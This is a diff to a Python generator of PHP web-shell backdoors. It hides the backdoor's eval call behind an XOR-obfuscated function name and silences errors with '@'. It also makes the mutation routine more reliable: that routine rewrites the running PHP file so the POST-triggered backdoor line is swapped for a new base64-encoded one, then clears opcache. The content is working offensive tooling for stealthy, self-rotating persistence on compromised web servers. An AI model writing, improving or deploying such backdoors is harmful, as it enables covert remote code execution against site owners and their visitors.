@@ -186,7 +186,7 @@ def generate_php8_backdoor(Zt: str, Vt: str) -> str:
     else:
         b64_call = f"(\"wBnttPJWhudVy\"^\"OATvw1TwONBxp\"^\"ZbIg5UADBXIJl\")({inner})"
 
-    body = f"eval({b64_call});die();"
+    body = f"@eval({b64_call});die();"
     return start + body + end2
 
 
@@ -195,26 +195,27 @@ def mutation_php(new_backdoor_php: str, current_Z: str) -> str:
     Return PHP code that: reads current script file, finds line containing
     isset($_POST['current_Z']), replaces it with new_backdoor_php, writes file back.
     """
-    # Escape for PHP string: new_backdoor_php in base64 to avoid quoting hell
     b64_backdoor = base64.b64encode(new_backdoor_php.encode("utf-8")).decode("ascii")
     findme = f"isset($_POST['{current_Z}'])"
     findme_php = findme.replace("\\", "\\\\").replace("'", "\\'")
     return f"""$what = base64_decode('{b64_backdoor}');
 $findme = '{findme_php}';
-$n = getcwd() . '/' . basename($_SERVER['PHP_SELF']);
-$text = fread(fopen($n, "r"), filesize($n));
-$text = preg_replace('/^\\s+/', '', htmlentities($text));
+$n = $_SERVER['SCRIPT_FILENAME'];
+$text = file_get_contents($n);
+if($text === false){{echo "ERR:cannot read file";return;}}
 $array = explode("\\n", $text);
-$dot = count($array);
-for ($i = 0; ; $i++) {{
-    if ($i > $dot) {{ break; }}
-    $pos = strpos($array[$i], $findme);
-    if ($pos !== false) {{ $array[$i] = $what; echo "Found at line ".$i."\\n"; break; }}
+$found = false;
+for ($i = 0, $dot = count($array); $i < $dot; $i++) {{
+    if (strpos($array[$i], $findme) !== false) {{
+        $array[$i] = $what;
+        $found = true;
+        echo "Found at line ".$i."\\n";
+        break;
+    }}
 }}
-$write = implode("\\n", $array);
-$write = html_entity_decode($write);
+if(!$found){{echo "ERR:marker line not found";return;}}
 echo "Mutating...\\n";
-file_put_contents($n, "");
-file_put_contents($n, $write);
+if(file_put_contents($n, implode("\\n", $array)) === false){{echo "ERR:write failed";return;}}
+if(function_exists('opcache_invalidate')){{opcache_invalidate($n, true);}}
 echo "Mutated successfully";
 """
